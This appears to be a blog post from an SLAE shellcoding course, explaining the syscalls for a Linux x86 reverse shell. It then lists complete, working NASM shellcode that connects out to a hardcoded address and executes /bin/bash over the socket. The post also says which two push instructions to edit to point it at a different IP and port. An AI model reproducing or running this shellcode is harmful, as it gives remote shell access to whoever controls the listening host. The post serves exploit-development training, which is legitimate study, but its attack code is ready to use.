---
layout: post
title: SLAE Exercise 2 - Reverse Shell
subtitle: Linux x86 Reverse Shell
tags: [SLAE]
---

**Overview**
The second task of the SLAE exam required a bind shell to be written. The requirements for this were as follows:

- Reverse connects to configured IP and Port
- Execs shell on succesful connection
- IP and Port should be easily configurable

**Requirements**

To determine the requirements for this exercise it needs to be understood what a reverse shell is. 

*What is a reverse shell?* 
A reverse shell connects back to the listening attacker's system, presenting that connection with a shell to the target system. 

*So what is needed from a reverse shell?* 
As per the requirements, it needs to reverse connect to a configured IP address and port and execute a shell on a successful connection. 

Due to the similarities between this and a bind shell, no higher level code will need to be analysed to determine what to do. The main difference between the two shells is that with a bind shell the system is awaiting an inbound connection and with a reverse shell the system is actively connecting outbound. Let's take a look at the socket calls that were used for the bind shell:

- Socket
- Bind
- Listen
- Accept
	
As can be seen here, for the bind shell a socket was created, it was bound to a port then set to listen for an incoming connection and will ultimately accept that connection. For a reverse shell the socket doesn't need to do any of the socketcall syscalls after creating the socket, instead it needs to use the 'connect' socketcall to connect outbound to  the waiting attackers machine. Based on this, the syscalls that are required for the reverse shell will be:

- socket (socketcall) - to create a socket
- connect (socketcall) - to use the previously created socket to connect outbound
- dup2 - To duplicate file descriptors allowing the connection to effectively be 'piped'
- execve - To execute /bin/bash, presenting it to the socket connection

The majority of this shellcode has been heavily explained within exercise 1. The exception being the connect socketcall. From the man pages for connect - 'man 2 connect', the structure required can be seen as below:

```
	int connect(int sockfd, const struct sockaddr *addr,socklen_t addrlen);
```

Therefore values have to be pushed to the stack to satisfy these requirements to be placed into ecx. What is needed it:

1. The File Descriptor returned from the socket (edx)
2. The sockaddr structure, found in 'man 7 ip'
3. The addrlen, which will use the stack pointer

Based on the code written for the reverse shell [here](https://github.com/14Deep/SLAE/tree/master/Exercise%202), the stack has been visualised which should clear up what will be where on the stack when the pointer is pushed to ecx. The stack would appear as below:

	Addr	Value	  Description
  
	0x6	  Edx	  FD from socketcall
	0x5	  *0x3	  Pointer to location 0x3
	0x4	  0x10	  Addrlen set to 16 bytes
	0x3	  0x2	  2 for IF_INET
	0x2	  0x4d01  The port required (333)
	0x1	  0xec01  IP address
	0x0	  0xa8c0  IP address

The code that has been written can be seen below, note that this has no comments and is only the code. The fully commented version can be found on Github as referenced earlier. The code for this exercise is:

```
; Filename: reverse.nasm
; Author:   Jake
; Website:  http://github.com/14deep
; Purpose:  Reverse shell shellcode for Linux x86 for the SLAE course


global _start			

section .text
_start:

  xor eax, eax
  xor ebx, ebx
  xor ecx, ecx
  xor edx, edx
  xor esi, esi

  ;Socket - create a socket
  push eax     
  push 0x1    
  push 0x2     
  mov al, 0x66 
  mov bl, 0x1 
  mov ecx, esp 
  int 0x80     
  mov edx, eax 

  ;Connect - Connect outbound
  mov al, 0x66 
  mov bl, 0x3  
  push dword 0xec01a8c0 
  push word 0x4d01      
  push word 0x2	      
  mov ecx, esp 
  push 0x10    
  push ecx     
  push edx     
  mov ecx, esp 
  int 0x80     

  ;dup2 - duplicate the file descriptor to redirect the incoming connection 
  mov al, 0x3f  
  mov ebx, edx  
  mov ecx, esi  
  int 0x80      
  mov al, 0x3f
  inc ecx       
  int 0x80      
  mov al, 0x3f
  inc ecx       
  int 0x80      
	
  ;execve - execute '/bin/bash' to provide a shell
  xor eax, eax  
  push eax      
  push 0x68736162
  push 0x2f6e6962
  push 0x2f2f2f2f
  mov ebx, esp 
  xor ecx, ecx 
  xor edx, edx 
  mov al, 0xb   
  int 0x80    
  ```

The following should be changed in order to change the IP address connected to and the port:
```
	Push dword 0xec01a8c0
	Push word 0x4d01
```



